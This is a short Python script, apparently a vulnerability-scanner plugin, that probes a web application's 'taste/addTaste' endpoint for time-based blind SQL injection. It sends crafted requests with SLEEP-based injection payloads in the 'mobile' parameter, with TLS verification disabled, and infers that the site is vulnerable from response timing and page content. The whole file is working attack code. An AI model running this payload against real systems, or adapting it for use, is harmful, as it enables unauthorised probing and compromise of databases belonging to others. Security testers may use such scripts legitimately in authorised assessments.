import requests,re,urllib3,time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%20E42J%20FROM%20(SELECT(SLEEP(8-(if(1=2,0,8)))))QWuA)%20OR%20%270weq%27=%275cyd"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	s = time.time()
	response=requests.get(url,headers=headers,timeout=10,verify=False)
	e1 = time.time()
	hs1=int(e1-s)
	url=baseurl+"taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%20E42J%20FROM%20(SELECT(SLEEP(8-(if(1=1,0,8)))))QWuA)%20OR%20%270weq%27=%275cyd"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=10,verify=False)
	e2 = time.time()
	hs2=int(e2-e1)
	if response.status_code == 200 and hs2-hs1>=6 and '"mainlogo":' in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
